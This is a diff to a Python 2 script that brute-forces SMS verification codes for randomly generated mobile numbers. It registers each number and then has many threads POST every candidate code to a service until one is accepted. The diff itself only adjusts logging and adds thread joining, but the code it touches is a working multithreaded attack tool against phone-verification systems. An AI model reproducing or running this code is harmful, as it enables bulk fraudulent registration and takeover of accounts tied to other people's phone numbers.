@@ -44,7 +44,7 @@ def sc(mob, id=5, start='000000', timeout=2):
         yzm = ''.join(map(str, i))
         if yzm < start:
             continue
-        print yzm
+        #print yzm
         data = {'id': id,
                 'mob': mob,
                 'yzm': yzm,
@@ -77,7 +77,10 @@ def msc(mob, id=5, group='0', timeout=2):
             print '-----other thread find-----'
             break
         yzm = group + ''.join(map(str, i)) 
-        print yzm 
+        #print yzm 
+        count = int(yzm)
+        if count % 1000 == 0:
+            print yzm, HIT_RESULT, mob 
         data = {'id': id, 
                 'mob': mob,
                 'yzm': yzm,
@@ -88,7 +91,7 @@ def msc(mob, id=5, group='0', timeout=2):
                 r = requests.post(url, data=data, headers=headers, timeout=timeout)
                 break
             except Exception, e:
-                print str(e), c, group
+                #print str(e), c, group
                 c += 1
                 time.sleep(0.5)
         status = r.json()['status']         
@@ -115,6 +118,8 @@ def mtask(mob, id=5, timeout=3, gd=2):
         t = threading.Thread(target=msc, args=(mob, id, g, timeout))
         THREADS.append(t)
         t.start()
+    for t in THREADS:
+        t.join()
 
 
 def gen_mob():
@@ -140,6 +145,7 @@ def loop(n=100):
     global THREADS, END_FLAG
     for i in xrange(n):
         mob = gen_mob()
+        print '++++++++', mob
         post_mob(mob)
         mtask(mob=mob)
         END_FLAG = False
